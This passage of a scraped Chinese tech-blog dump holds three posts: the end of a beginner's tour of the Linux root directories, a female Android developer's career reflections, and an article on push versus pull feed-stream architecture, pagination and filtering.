id=\"crayon-5b622efe67378568670428-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>你应该看到如图 1 所示。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/7d8ec1149862c8f94f7abb5f230f2211.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>tree</em></p>\n<p>上面的指令可以翻译为“只显示以 <code>/</code>（根目录） 开头的目录树的第一级”。 <code>-L</code> 选项告诉树你想看到多少层目录。</p>\n<p>大多数 Linux 发行版都会向你显示与你在上图中看到的相同或非常类似的结构。 这意味着，即使你现在感到困惑，掌握这一点，你将掌握大部分（如果不是全部的话）全世界的 Linux 文件系统。</p>\n<p>为了让你开始走上掌控之路，让我们看看每个目录的用途。 当我们查看每一个目录的时候，你可以使用 <code>ls</code> 来查看他们的内容。</p>\n<h3 id=\"toc_2\">目录</h3>\n<p>从上到下，你所看到的目录如下</p>\n<h4 id=\"toc_3\">/bin</h4>\n<p><code>/bin</code> 目录是包含一些二进制文件的目录，即可以运行的一些应用程序。 你会在这个目录中找到上面提到的 <code>ls</code> 程序，以及用于新建和删除文件和目录、移动它们基本工具。还有其它一些程序，等等。文件系统树的其他部分有更多的 <em>bin</em> 目录，但我们将在一会儿讨论这些目录。</p>\n<h4 id=\"toc_4\">/boot</h4>\n<p><code>/boot</code> 目录包含启动系统所需的文件。我必须要说吗？ 好吧，我会说：<strong>不要动它</strong>！ 如果你在这里弄乱了其中一个文件，你可能无法运行你的 Linux，修复被破坏的系统是非常痛苦的一件事。 另一方面，不要太担心无意中破坏系统：你必须拥有超级用户权限才能执行此操作。</p>\n<h4 id=\"toc_5\">/dev</h4>\n<p><code>/dev 目录包含设备文件。 其中许多是在启动时或甚至在运行时生成的。 例如，如果你将新的网络摄像头或 USB 随身碟连接到你的机器中，则会自动弹出一个新的设备条目。</code></p>\n<h4 id=\"toc_6\">/etc</h4>\n<p><code>/etc</code> 的目录名称会让人变得非常的困惑。<code>/etc</code> 得名于最早的 Unix 系统们，它的字面意思是 “etcetera”（诸如此类） ，因为它是系统文件管理员不确定在哪里放置的文件的垃圾场。</p>\n<p>现在，说 <code>/etc</code> 是“要配置的所有内容Everything To Configure”更为恰当，因为它包含大部分（如果不是全部的话）的系统配置文件。 例如，包含系统名称、用户及其密码、网络上计算机名称以及硬盘上分区的安装位置和时间的文件都在这里。 再说一遍，如果你是 Linux 的新手，最好是不要在这里接触太多，直到你对系统的工作有更好的理解。</p>\n<h4 id=\"toc_7\">/home</h4>\n<p><code>/home</code> 是你可以找到用户个人目录的地方。在我的情况下，<code>/home</code> 下有两个目录：<code>/home/paul</code>，其中包含我所有的东西；另外一个目录是 <code>/home/guest</code> 目录，以防有客人需要使用我的电脑。</p>\n<h4 id=\"toc_8\">/lib</h4>\n<p><code>/lib</code> 是库文件所在的地方。库是包含应用程序可以使用的代码文件。它们包含应用程序用于在桌面上绘制窗口、控制外围设备或将文件发送到硬盘的代码片段。</p>\n<p>在文件系统周围散布着更多的 <code>lib</code> 目录，但是这个直接挂载在 <code>/</code> 的 <code>/lib</code> 目录是特殊的，除此之外，它包含了所有重要的内核模块。 内核模块是使你的显卡、声卡、WiFi、打印机等工作的驱动程序。</p>\n<h4 id=\"toc_9\">/media</h4>\n<p>在 <code>/media</code> 目录中，当你插入外部存储器试图访问它时，将自动挂载它。与此列表中的大多数其他项目不同，<code>/media</code> 并不追溯到 1970 年代，主要是因为当计算机正在运行而动态地插入和检测存储（U 盘、USB 硬盘、SD 卡、外部 SSD 等)，这是近些年才发生的事。</p>\n<h4 id=\"toc_10\">/mnt</h4>\n<p>然而，<code>/mnt</code> 目录是一些过去的残余。这是你手动挂载存储设备或分区的地方。现在不常用了。</p>\n<h4 id=\"toc_11\">/opt</h4>\n<p><code>/opt</code> 目录通常是你编译软件（即，你从源代码构建，并不是从你的系统的软件库中安装软件）的地方。应用程序最终会出现在 <code>/opt/bin</code> 目录，库会在 <code>/opt/lib</code> 目录中出现。</p>\n<p>稍微的题外话：应用程序和库的另一个地方是 <code>/usr/local</code>，在这里安装软件时，也会有 <code>/usr/local/bin</code> 和 <code>/usr/local/lib</code> 目录。开发人员如何配置文件来控制编译和安装过程，这就决定了软件安装到哪个地方。</p>\n<h4 id=\"toc_12\">/proc</h4>\n<p><code>/proc</code>，就像 <code>/dev</code> 是一个虚拟目录。它包含有关你的计算机的信息，例如关于你的 CPU 和你的 Linux 系统正在运行的内核的信息。与 <code>/dev</code> 一样，文件和目录是在计算机启动或运行时生成的，因为你的系统正在运行且会发生变化。</p>\n<h4 id=\"toc_13\">/root</h4>\n<p><code>/root</code> 是系统的超级用户（也称为“管理员”）的主目录。 它与其他用户的主目录是分开的，<strong>因为你不应该动它</strong>。 所以把自己的东西放在你自己的目录中，伙计们。</p>\n<h4 id=\"toc_14\">/run</h4>\n<p><code>/run</code> 是另一个新出现的目录。系统进程出于自己不可告人的原因使用它来存储临时数据。这是另一个<strong>不要动它</strong>的文件夹。</p>\n<h4 id=\"toc_15\">/sbin</h4>\n<p><code>/sbin</code> 与 <code>/bin</code> 类似，但它包含的应用程序只有超级用户（即首字母的 <code>s</code> ）才需要。你可以使用 <code>sudo</code> 命令使用这些应用程序，该命令暂时允许你在许多 Linux 发行版上拥有超级用户权限。<code>/sbin</code> 目录通常包含可以安装、删除和格式化各种东西的工具。你可以想象，如果你使用不当，这些指令中有一些是致命的，所以要小心处理。</p>\n<h4 id=\"toc_16\">/usr</h4>\n<p><code>/usr</code> 目录是在 UNIX 早期用户的主目录所处的地方。然而，正如我们上面看到的，现在 <code>/home</code> 是用户保存他们的东西的地方。如今，<code>/usr</code> 包含了大量目录，而这些目录又包含了应用程序、库、文档、壁纸、图标和许多其他需要应用程序和服务共享的内容。</p>\n<p>你还可以在 <code>/usr</code> 目录下找到 <code>bin</code>，<code>sbin</code>，<code>lib</code> 目录，它们与挂载到根目录下的那些有什么区别呢？现在的区别不是很大。在早期，<code>/bin</code> 目录（挂载在根目录下的）只会包含一些基本的命令，例如 <code>ls</code>、<code>mv</code> 和 <code>rm</code> ；这是一些在安装系统的时候就会预装的一些命令，用于维护系统的一个基本的命令。 而 <code>/usr/bin</code> 目录则包含了用户自己安装和用于工作的软件，例如文字处理器，浏览器和一些其他的软件。</p>\n<p>但是许多现代的 Linux 发行版只是把所有的东西都放到 <code>/usr/bin</code> 中，并让 <code>/bin</code> 指向 <code>/usr/bin</code>，以防彻底删除它会破坏某些东西。因此，Debian、Ubuntu 和 Mint 仍然保持 <code>/bin</code> 和 <code>/usr/bin</code> （和 <code>/sbin</code> 和 <code>/usr/sbin</code> ）分离；其他的，比如 Arch 和它衍生版，只是有一个“真实”存储二进制程序的目录，<code>/usr/bin</code>，其余的任何 <code>bin</code> 目录是指向 <code>/usr/</code>bin 的“假”目录。</p>\n<h4 id=\"toc_17\">/srv</h4>\n<p><code>/srv</code> 目录包含服务器的数据。如果你正在 Linux 机器上运行 Web 服务器，你网站的 HTML文件将放到 <code>/srv/http</code>（或 <code>/srv/www</code>）。 如果你正在运行 FTP 服务器，则你的文件将放到 <code>/srv/ftp</code>。</p>\n<h4 id=\"toc_18\">/sys</h4>\n<p><code>/sys</code> 是另一个类似 <code>/proc</code> 和 <code>/dev</code> 的虚拟目录，它还包含连接到计算机的设备的信息。</p>\n<p>在某些情况下，你还可以操纵这些设备。 例如，我可以通过修改存储在 <code>/sys/devices/pci0000:00/0000:00:02.0/drm/card1/card1-eDP-1/intel_backlight/brightness</code> 中的值来更改笔记本电脑屏幕的亮度（在你的机器上你可能会有不同的文件）。但要做到这一点，你必须成为超级用户。原因是，与许多其它虚拟目录一样，在 <code>/sys</code> 中打乱内容和文件可能是危险的，你可能会破坏系统。直到你确信你知道你在做什么。否则不要动它。</p>\n<h4 id=\"toc_19\">/tmp</h4>\n<p><code>/tmp</code> 包含临时文件，通常由正在运行的应用程序放置。文件和目录通常（并非总是）包含应用程序现在不需要但以后可能需要的数据。</p>\n<p>你还可以使用 <code>/tmp</code> 来存储你自己的临时文件 —— <code>/tmp</code> 是少数挂载到根目录下而你可以在不成为超级用户的情况下与它进行实际交互的目录之一。</p>\n<h4 id=\"toc_20\">/var</h4>\n<p><code>/var</code> 最初被如此命名是因为它的内容被认为是可变的variable，因为它经常变化。今天，它有点用词不当，因为还有许多其他目录也包含频繁更改的数据，特别是我们上面看到的虚拟目录。</p>\n<p>不管怎样，<code>/var</code> 目录包含了放在 <code>/var/log</code> 子目录的日志文件之类。日志是记录系统中发生的事件的文件。如果内核中出现了什么问题，它将被记录到 <code>/var/log</code> 下的文件中；如果有人试图从外部侵入你的计算机，你的防火墙也将记录尝试。它还包含用于任务的假脱机程序。这些“任务”可以是你发送给共享打印机必须等待执行的任务，因为另一个用户正在打印一个长文档，或者是等待递交给系统上的用户的邮件。</p>\n<p>你的系统可能还有一些我们上面没有提到的目录。例如，在屏幕截图中，有一个 <code>/snap</code> 目录。这是因为这张截图是在 Ubuntu 系统上截取的。Ubuntu 最近将 <a href=\"https://www.ubuntu.com/desktop/snappy\">snap</a> 包作为一种分发软件的方式。<code>/snap</code> 目录包含所有文件和从 snaps 安装的软件。</p>\n<h3 id=\"toc_21\">更深入的研究</h3>\n<p>这里仅仅谈了根目录，但是许多子目录都指向它们自己的一组文件和子目录。图 2 给出了基本文件系统的总体概念（图片是在 Paul Gardner 的 CC BY-SA 许可下提供的），<a href=\"https://en.wikipedia.org/wiki/Unix_filesystem#Conventional_directory_layout\">Wikipedia 对每个目录的用途进行了总结</a>。</p>\n<p><img class=\"aligncenter\" title=\"filesystem\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/fe6ae1c96f1282575403c8fd4706830f.png\" alt=\"filesystem\"></p>\n<p style=\"text-align: center\"><em>图 2：标准 Unix 文件系统</em></p>\n<p>要自行探索文件系统，请使用 <code>cd</code> 命令：<code>cd</code>将带你到你所选择的目录（ <code>cd</code> 代表更改目录）。</p>\n<p>如果你不知道你在哪儿，<code>pwd</code>会告诉你，你到底在哪里，（ <code>pwd</code> 代表打印工作目录 ），同时 <code>cd</code>命令在没有任何选项或者参数的时候，将会直接带你到你自己的主目录，这是一个安全舒适的地方。</p>\n<p>最后，<code>cd ..</code>将会带你到上一层目录，会使你更加接近根目录，如果你在 <code>/usr/share/wallpapers</code> 目录，然后你执行 <code>cd ..</code> 命令，你将会跳转到 <code>/usr/share</code> 目录</p>\n<p>要查看目录里有什么内容，使用 <code>ls</code> 或这简单的使用 <code>l</code> 列出你所在目录的内容。</p>\n<p>当然，你总是可以使用 <code>tree</code> 来获得目录中内容的概述。在 <code>/usr/share</code> 上试试——里面有很多有趣的东西。</p>\n<h3 id=\"toc_22\">总结</h3>\n<p>尽管 Linux 发行版之间存在细微差别，但它们的文件系统的布局非常相似。 你可以这么说：一旦你了解一个，你就会都了解了。 了解文件系统的最好方法就是探索它。 因此，伴随 <code>tree</code> ，<code>ls</code> 和 <code>cd</code> 进入未知的领域吧。</p>\n<p>你不会只是因为查看文件系统就破坏了文件系统，因此请从一个目录移动到另一个目录并进行浏览。 很快你就会发现 Linux 文件系统及其布局的确很有意义，并且你会直观地知道在哪里可以找到应用程序，文档和其他资源。</p>\n<p>通过 Linux 基金会和 edX 免费的 “<a href=\"https://training.linuxfoundation.org/linux-courses/system-administration-training/introduction-to-linux\">Linux入门</a>” 课程了解更多有关 Linux 的信息。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114189\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114189votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114189\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"url_object_id": "2c16502f87052a1459d6e26767dc37ac", "title": ["一个安卓程序媛的人生经验"], "url": "http://blog.jobbole.com/114236/", "create_date": "2018/07/27", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/03/career.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "职场, 程序员", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/rjzheng/p/9351626.html\">孤独烟</a>   </div><h2 id=\"引言\">引言</h2>\n<p>博主有一个差不多认识了9年的程序媛朋友，从09年读大一开始认识的，现在已经毕业五年，所以相识是九年。目前她就职于网龙、是一个做安卓组件开发的程序媛，<strong>已婚</strong>。本文基本上反应了她的心酸血泪史，经其同意，整理成文。为了方便描述，下面的第一人称”我”指的就是该妹纸本人。</p>\n<h2 id=\"糊里糊涂的大学生涯\">糊里糊涂的大学生涯</h2>\n<p>高考毕业后，也不知道自己的兴趣是啥，稀里糊涂的报了一个专业，最后阴差阳错的来了一个电子类专业。来了这个专业后，发现了一个现象。</p>\n<blockquote><p><strong>大部分就读工科专业的妹纸，都是瞎选的，要么就是调剂。基本上，对本专业都缺乏一个了解。而且大部分抱着一个混学历的心态来读，都不知道自己将来要做什么</strong></p></blockquote>\n<p>(博主ps：博主明白强迫自己学一个自己不敢兴趣的科目是件多无聊的事情。所以针对这个现象，并不是很排斥，毕竟有些人的家境，并不需要太努力的奋斗。)</p>\n<p>大一上，无外乎就是一些公共课什么的，计算机一级考的是一些关于word、excel等操作，和编程没有什么关系。所以严格算起来，第一次接触到编程，是在大一下学期的C语言课程。非常有意思的是，没接触过编程的我，最后计算机二级考试居然考了满分。当时，我就明白，我在编程方面有着一种天赋，起码不会排斥。<br>\n俗话说</p>\n<blockquote><p><strong>兴趣是最好的老师</strong></p></blockquote>\n<p>对编程有兴趣的我，本来应该在这个领域继续深造。然而在大二和大三并没有接触到其他语言，因此水平一直停滞不前。或许你会说，你可以去自学啊。这里要说一下，我在大学期间的性格是属于一种<strong>需要外界给予一定压力和指导，才会去学习。</strong> 换句话说，如果当初大一下的C语言不需要参加计算机二级考试，我就不会那么努力学习，不会发现自己在编程方面的天赋。因此大二和大三，仅仅满足于上课所传授的知识，沉溺于奖学金的优越感之中。<br>\n转眼间到了大四，那会是12年。记得11年的时候，NOKIA的塞班机基本上已经退出市场，android那会的火热程度就和现在的微服务一样，于是当时就想着毕业从事一个和android开发相关的工作。由于自己性格的原因，选了一个android的项目作为自己的毕业设计。前面也说了，我需要一定压力来逼迫自己，才会有动力去做。所以在自己没有任何JAVA基础的情况下，选android项目作为自己的毕业设计，也是希望逼迫自己学有所成。这里有一点需要注意，</p>\n<blockquote><p><strong>自学过程中最大的敌人，就是寂寞</strong></p></blockquote>\n<p>坦白说，在学习过程中，不止一次怕来不及，怕做不出来毕设，怕毕不了业，不止一次动过要去某宝买一个的念头。而且一个人默默的学习，遇到不会的，容易浮躁。当时只有一个信念,我一定能做出来。</p>\n<blockquote><p><strong>当一个人的心中有着更高的山峰想去攀登时,他就不会在意脚下的泥沼,他才可能用最平静的方式去面对一般人难以承受的痛苦</strong></p></blockquote>\n<p>最后的结果就是，我做出来了，是一个支持各种格式的手机端阅读器。有意思的是，这个项目当时拿到了优秀毕业设计。也因为这个项目找到了工作。(大家想想，面试的时候，直接掏出手机晒自己的项目，比简历上写一堆经验有意义的多了。)</p>\n<h2 id=\"懵懵懂懂的工作生涯\">懵懵懂懂的工作生涯</h2>\n<p>工作时第一家公司，是一家创业小公司，做的是影城里头的那种，订票的APP。这里有几条经验其实需要和大家进行分享。<br>\n千万不要有如下想法</p>\n<blockquote><p><strong>因为我是女生，所以我编程水平不好也很正常。<br>\n我是安卓端的，不懂后端知识也没关系</strong></p></blockquote>\n<p>坦白说，我很讨厌女生有这种想法。人一旦有了这种想法，就给自己套上了一层枷锁，无法发挥出自己的潜力。我们必须承认一点，人都是有惰性的。而且经常会给自己的懒惰，找寻各种各样的合理的理由。比如，把这个电视剧看完，再开始学习，等等。总之，你只要给自己找了一个这样的理由，每次你偷懒的时候，都会以这种理由给自己洗脑。从此，技术水平止步不前，它会成为你不思进取的借口。<br>\n或许正是因为，自己没有给自己套上这层枷锁，在毕业后的一年内努力学习，于是跳槽进入了网龙。</p>\n<blockquote><p><strong>女程序员在工作过程中，受到优待。</strong></p></blockquote>\n<p>网上有一个图很出名，如下所示<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/456712107e0ca1e7a37f25ffb0542163.jpg\" alt=\"image\"></p>\n<p>这个情况在工作中，确实还是存在的。其实可能是因为开发行业，男生比较多的原因，女生会受到优待一些。基本上女程序员遇到问题，一些男程序员会加班给你调BUG，当然加班程度取决于颜值。至于男程序员们遇到问题，那就真的只能靠自己了。但是，大家要注意</p>\n<blockquote><p><strong>一些能百度到的问题，就不要去咨询同事</strong></p></blockquote>\n<p>这里就不得不说了，有些同事，特别是女同事吧。反正总爱问一些，比如环境怎么搭建这种问题。坦白说，这些问题，你问出去了，只会耽误老员工的时间。人家脾气好，跟你说。遇到一些脾气差的，索性就直接不理你了。总之，予人方便就是予己方便。像一些业务上的知识就是可以去问老员工，千万不要去问一些什么语法啊、环境搭建的问题。</p>\n<blockquote><p><strong>做好自己的职业规划</strong></p></blockquote>\n<p>男生和女生还是存在着很大的体力差距的，这个不得不承认。包括在很多长辈眼里，都是觉得:”女生嘛，找一个轻松的工作，将来嫁人就好了。”<br>\n这里我想说的是在当程序员的时候，还是要保持一种学习的热情。就我来说，目前还是这种学习的热情还是没有褪去。如果一旦发现自己的学习热情褪去，就可以思考一下自己是否能在开发的路上走的更远，是不是做管理会更合适呢？不过，不可否认，肯定会有一些直男癌患者，跟你说:”你们女生体力不行啊，什么什么的，就应该去切切图，做做产品啊，什么什么的。”对于这一切质疑，我们要要走自己的路。<br>\n有一句话叫做</p>\n<blockquote><p><strong>行亦禅,坐亦禅,语默动静体安然。</strong></p></blockquote>\n<p>大致意思就是，不论你在做什么事,心中感到自在安然，这就是禅。人生有很多痛苦都是因为别人的”中伤”，我们都避免不了心中会有疑虑，只要拥有一颗安详的心，别人就不可能在此作怪。</p>\n<blockquote><p><strong>注意护发</strong></p></blockquote>\n<p>当程序员后，一定要注意自己的发际线。女生也不例外，大家要注意保养。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114236\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114236votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114236\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/18fc86594a34c2bebbefd765480669feb0504c69.jpg"},{"url_object_id": "7b4b289d21745010a22e3afbfc59d82c", "title": ["关于 Feed 流的几个热门问题"], "url": "http://blog.jobbole.com/114156/", "create_date": "2018/07/09", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2011/11/software-development-logo.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "IT技术, API, Feed, 架构设计", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/vincent7\">v7</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><div>\n<h2><b>0x00 前言</b></h2>\n<p>本篇聊一下 Feed 流技术，由于这个话题在业界有丰富的实践经验，所以我特意选了个小的切入点，从相对微观的角度说几个具体的问题，避免一些无意义的重复。希望提炼实践中的具体问题来做讨论，使事情变得更有实际意义。</p>\n<h2><b>0x01 先行资料</b></h2>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/20690652\">什么是 Feed 流</a></li>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/NFH8XVXpprMHOEEAovND2A\" target=\"_blank\" rel=\"nofollow noreferrer\">如何设计 Twitter 这样的系统架构</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/30226315\">如何打造千万级Feed流系统</a></li>\n</ul>\n<h2><b>0x02 关于模型</b></h2>\n<p>当要做一个 Feed 流，摆在我们眼前的第一个问题就是到底选推模型还是选拉模型，因为这个选择将影响接下来一系列的架构方式。</p>\n<ul>\n<li><b>推模型 or 拉模型</b></li>\n</ul>\n<p>推模型和拉模型各自的优缺点已经被罗列了很多了，比如推模型的存储量大，或者拉模型的效率可能低，但如果你从无到有做这个事情，这些优缺点的罗列还是无法帮助你做出最初的决定，所谓的“知道了许多道理，还是过不好这一生”，当然除非你有实际的构造大流量 Feed 流的经验。</p>\n<p>然而根据我们的经验：基于正确规范的架构和基础设施，对于一个千万日活量级的应用 Feed 流， 拉模型完全可以扛得住。</p>\n<p>我想，上面这个结论是很有意义的，尤其是对中小创业公司，因为拉模型本身节省存储资源，开发成本低，上线速度快，在业务爆发之前做这样一个 Feed 流，有这样一个明确经验可以帮助你快速做出决定。</p>\n<p>另外，上面说的千万日活，并不是说就是拉模型的上限，而是说，如果你做到千万日活，你将会有丰富的实践经验帮助你走下一步，那时也会有更多的资源让你使用，是继续深挖拉模型潜能，还是上推拉结合消灭性能问题，将是另外一个够挑战的问题了。</p>\n<ul>\n<li><b>推模型的原罪</b></li>\n</ul>\n<p>上一节我的描述有些极端，本意上我是想给出更明确的实践结论，因为对于推拉模型的积累对比已经够多了，现在难的似乎是做决定时的信心。那这一节，我就来聊推模型的几个问题。</p>\n<p><b>耗存储</b>。推模型可以理解为给每个粉丝维护一个单独的存储，举例来说，如果某个大 V 有一千万粉丝，他发的一条内容，将被存储一千万份，这个存储放大是非常可观的。于是这里就会常见的问题：一、有多少存储资源能用，这些资源贵不贵？二、如果省掉这些资源存储，响应时间性能到底能打多少折扣，这些折扣值不值？这是个时间和空间的冲突，程序员每天都在做这种问题的衡量，每个系统的要求基准也不一样，我就不妄下结论了。</p>\n<p><b>写峰值。</b>推模型有一个写峰值的问题，通常，我们做推模型，给粉丝写数据的时候一般是离线的，也就是大 V 发布完内容，触发离线写任务推给各个粉丝。可大 V 是少数，大部分时候，都是普通用户在发布，写任务没有那么多，这时，离线写任务的 worker 数可能用不了几个，可一旦大 V 发布了内容，这个写任务会骤增，突然来一个大峰值，如何处理这个峰值是个问题。有些方案：一、把资源调度系统做的超级棒，worker 数量自动化跟着调整，峰值来了的时候，worker 自动迅速扩容，消费离线任务，并在离线任务处理完毕之后缩容，避免资源浪费，这个调度确实需要很棒，因为大多时候，Feed 流对这些任务的要求是很严苛的，比如，产品上希望粉丝至少也是在分钟级看到大 V 发的内容，甚至秒级，这对调度系统的挑战是巨大的。二、推拉结合，大 V 走拉模型逻辑，这个方案的问题就是，你其实做了两套系统，开发成本大。</p>\n<p><b>避不开的业务逻辑。</b>这一点是从业务逻辑开发上来说的，这个也是在具体业务开发过程中推模型让人觉得很难受的点，就是：当我解决很多问题之后，从业务逻辑开发层面，我还是避不开很多业务逻辑。为什么这么说呢，就是在推模型里，每个粉丝都存有一个属于他的数据，但这部分数据在接口设计和数据返回上，也仅仅就是元数据，这份元数据，还是要经过很多处理才能返回给用户，比如过滤、Format，我们希望推模型维护的那个存储是一份尽可能干净的数据，但事情却没那么简单。</p>\n<p>不过，以上是我个人的一些总结，由于在推模型上我没有走的更远，这些问题到底是不是真正的问题，欢迎来喷。</p>\n<h2><b>0x03 关于数据</b></h2>\n<p>模型的事情就不过多说了，再来聊几个关于数据的具体问题。</p>\n<ul>\n<li><b>有状态与无状态</b></li>\n</ul>\n<p>这是 Feed 流的 API 接口设计相关的问题。</p>\n<p>举个例子，在拉取 Feed 流数据时候， API 层面基于数量 offset/limit 的分页方案是完全不行的，因为用户 Feed 流的新数据会 insert 到流最开始位置，仅仅给出 offset 会导致分页数据错乱，所以会给出一种 after/limit 的分页方案，就是有一个标志数据，意义是“从 after 这个数据向后取 limit 条数据”；但是，这仅仅是一个干净的 Feed 流的情况下，在实际的业务需求中，Feed 流中的数据会更复杂，复杂到打乱这个看起来可行的分页方式。</p>\n<p>以分页这个例子来说，它为什么会这么脆弱呢? 我总结是因为 API 的数据请求是无状态的，用户在取第二页数据的时候，并不知道取第一页数据时到底发生了什么，仅仅知道在接口层面传递的几个值（offset/after/limt），而许多时候尤其是对于 Feed 流的一些时候这些值不够用，导致数据拉取变得棘手。</p>\n<p>所以，如果 Feed 流的数据获取是有状态就好了，就像浏览器与服务器之间的 Session，保持用户一个访问周期的上下文数据，这样想做什么就都好做了。</p>\n<ul>\n<li><b>数据 Format</b></li>\n</ul>\n<p>通常，Feed 流中的数据会来自多个不同的源，最后返回给用户之前需要做数据的 Format，这个过程是个性能黑洞，经常包含了很多 IO，你可能要读大量存储，读大量 RPC来获取到数据才能成功组装。所以针对数据 Format 有很多性能优化的点，包括不限于：消灭慢查询、减少调用放大、并行获取数据、做好缓存、操作批量。</p>\n<p>要做好性能优化，好的结构是必需的，比如要减少调用放大，那就要尽量保证数据复用和批量获取，只有你的代码结构好，才会有更合适的地方去获取数据和复用数据；也同样，只有你把可以并行部分都很清晰的摘离出来了，才能更合适地去做统一并行。</p>\n<p>而诸如消灭慢查询、做好缓存，此类其他细节也都是重要的，这里就不展开。</p>\n<ul>\n<li><b>过滤</b></li>\n</ul>\n<p>几乎所有的 Feed 流都有过滤需求，比如对已经读过的内容进行过滤，或者对已经被作者删除的内容进行过滤。</p>\n<p>过滤是个具体的事情，有的时候你仅仅需要元数据就能过滤，有的时候你需要对拿到完整数据才能过滤。总结一句话就是过滤的繁琐与否取决于产品需求，但好的结构可以让过滤变得更符合逻辑，性能表现更好。</p>\n<h2><b>0x04 结语</b></h2>\n<p>Feed 流是个不小的系统，三言两语只是管中窥豹，长时间没写分享文章了行文也变得不太流畅，希望看完这篇你会有所收获吧。</p>\n</div>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我写出更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏作者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我写出更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/30091aff79e77ecbab99678473d262ea.jpeg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/d0895096265ab585cdb52a0119e21608.jpeg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114156\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114156votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114156\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a 